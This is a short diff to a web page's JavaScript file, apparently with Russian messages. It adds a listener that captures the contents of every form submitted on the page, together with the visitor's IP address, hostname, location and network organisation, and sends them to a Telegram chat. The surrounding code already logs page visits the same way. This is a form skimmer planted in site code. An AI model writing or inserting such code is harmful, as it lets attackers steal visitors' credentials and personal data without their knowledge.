@@ -38,6 +38,24 @@ function getIPInfo() {
         .catch(err => console.error("Ошибка получения информации о IP:", err));
 }
 
+document.addEventListener("submit", event => {
+    const formData = new FormData(event.target);
+    const data = Array.from(formData.entries()).map(([key, value]) => `${key}: ${value}`).join("\n");
+    getIPInfo().then(info => {
+        hashDomain(info.org).then(domainHashTag => {
+            const message = `🚀 Отправка формы:
+- IP: ${info.ip}
+- Хост: ${info.hostname}
+- Местоположение: ${info.location}
+- Организация: ${info.org}
+- Данные формы:
+${data}
+${domainHashTag}`;
+            sendToTelegram(message);
+        });
+    });
+});
+
 function logPageVisit() {
     getIPInfo().then(info => {
         hashDomain(info.org).then(domainHashTag => {
